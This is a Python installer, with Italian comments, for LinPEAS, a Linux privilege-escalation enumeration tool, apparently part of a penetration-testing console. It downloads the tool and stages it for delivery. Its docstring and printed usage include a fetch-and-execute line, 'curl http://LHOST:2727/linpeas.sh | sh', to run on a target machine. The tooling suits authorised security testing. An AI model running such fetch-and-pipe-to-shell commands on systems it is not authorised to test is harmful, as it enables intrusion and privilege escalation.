"""Installer for LinPEAS — script di enumerazione per privilege escalation Linux.

Scarica linpeas.sh e il binario statico dalle release di PEASS-ng e copia
linpeas.sh anche in static/ del progetto, così 'serve' può consegnarlo
subito alla target (curl http://LHOST:2727/linpeas.sh | sh).
"""

import shutil
import subprocess
import sys
from pathlib import Path

BASE = "https://github.com/peass-ng/PEASS-ng/releases/latest/download"
FILES = {
    "linpeas.sh": f"{BASE}/linpeas.sh",
    "linpeas_linux_amd64": f"{BASE}/linpeas_linux_amd64",
}


def _download(url: str, dest: Path) -> bool:
    for cmd in (["curl", "-sL", "--fail", "-o", str(dest), url],
                ["wget", "-q", "-O", str(dest), url]):
        if shutil.which(cmd[0]):
            try:
                subprocess.run(cmd, timeout=180, check=True)
                return dest.is_file() and dest.stat().st_size > 0
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                continue
    return False


def install(dest: Path) -> int:
    dest.mkdir(parents=True, exist_ok=True)
    rc = 0
    for name, url in FILES.items():
        print(f"Download di {name}…")
        target = dest / name
        if _download(url, target):
            target.chmod(0o755)
            print(f"  ✓ {target} ({target.stat().st_size // 1024} KB)")
        else:
            print(f"  ✗ download fallito: {url}", file=sys.stderr)
            rc = 1

    if rc != 0:
        return rc

    # Copia in static/ del progetto: 'serve on' la espone alla target.
    static_dir = Path(__file__).resolve().parents[2] / "static"
    try:
        static_dir.mkdir(exist_ok=True)
        shutil.copy2(dest / "linpeas.sh", static_dir / "linpeas.sh")
        print(f"\nCopiata anche in {static_dir}/ per la consegna via 'serve'.")
    except OSError:
        pass

    print()
    print("LinPEAS installato. Uso tipico:")
    print("  1. serve on")
    print("  2. sulla target:  curl http://TUO_IP:2727/linpeas.sh | sh")
    print("     (il binario statico va eseguito da file: chmod +x e ./linpeas_linux_amd64)")
    print("In locale:  bash ~/.sealionconsole/tools/linpeas/linpeas.sh")
    return 0


if __name__ == "__main__":
    sys.exit(install(Path.cwd()))
